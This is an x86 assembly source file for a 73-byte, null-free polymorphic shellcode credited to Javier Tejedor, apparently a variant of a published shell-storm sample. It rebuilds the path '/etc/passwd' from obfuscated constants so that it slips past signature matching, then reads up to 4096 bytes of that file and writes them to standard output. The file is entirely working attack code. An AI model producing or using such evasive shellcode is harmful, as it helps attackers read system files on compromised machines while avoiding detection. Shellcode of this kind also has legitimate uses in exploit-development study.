;tiny_read_file_shellcode_polymorphism

;73 bytes
;null-free
;read 4096 bytes from /etc/passwd file
;Testing
;tiny_read_file_shellcode

;Polymorphism of this shellcode http://www.shell-storm.org/shellcode/files/shellcode-842.php
;author Javier Tejedor

global _start 
 
section .text 
_start:

	xor ecx,ecx
	xor eax, eax
	push 5
	pop eax
	push ecx

	mov esi, 0x41545050
	add esi, 0x23232323
	push esi
	
	mov esi, 0x4D5C1B4F 
	add esi, 0x14141414
	push esi

	mov esi, 0x998A5454
	sub esi, 0x25252525
	push esi
	
	mov ebx,esp
	int 0x80
	xchg eax,ebx
	xchg eax,ecx
	mov al,0x3
	xor edx,edx
	mov dx,0xfff
	inc edx
	int 0x80
	xchg eax,edx
	xor eax,eax
	mov al,0x4
	mov bl,0x1
	int 0x80
	xchg eax,ebx
	int 0x80
